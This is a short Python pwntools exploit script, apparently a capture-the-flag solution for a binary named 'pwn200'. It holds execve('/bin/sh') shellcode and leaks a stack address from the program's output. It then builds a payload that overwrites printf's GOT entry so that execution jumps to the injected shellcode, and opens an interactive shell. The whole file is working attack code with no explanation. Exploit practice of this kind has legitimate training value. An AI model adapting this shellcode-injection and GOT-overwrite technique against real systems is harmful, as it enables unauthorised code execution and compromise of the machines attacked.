#!/usr/bin/env python
# coding:utf-8

import pwn
import binascii

# shellcode = "\xeb\x0b\x5f\x48\x31\xd2\x52\x5e\x6a\x3b\x58\x0f\x05\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"
shellcode = "\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"

Io = pwn.process("./pwn200")

# concat the string
print Io.recvline()
Io.send(shellcode + "\xcc" * (0x30 - len(shellcode)))
main_rbp_addr = pwn.u64(Io.readline()[48:48+6] + "\x00\x00")
print "[+] rbp (main) : %s" % (hex(main_rbp_addr))
main_stack_size = 0x10
address_size = 0x08
input_name_rbp_addr = main_rbp_addr - main_stack_size - address_size * 2
print "[+] rbp (input_name) : %s" % (hex(input_name_rbp_addr))
input_name_stack_size = 0x40
input_money_rbp_addr = input_name_rbp_addr - input_name_stack_size - 0x10 - 0x10
print "[+] rbp (input_money) : %s" % (hex(input_money_rbp_addr))


# send id
Io.sendline("1")
print Io.readline()
print Io.readline()

# send money
buffer_size = 0x40
printf_got = pwn.p64(0x602030)
shellcode_addr = pwn.p64(input_name_rbp_addr - 0x30)
payload = shellcode_addr + "\x00" * (buffer_size - address_size * 2) + printf_got
print "[+] [LENGTH] : %d" % (len(payload))

with open("payload.dat", "w") as f:
    f.write(payload)

# send payload
Io.send(payload)
Io.interactive()
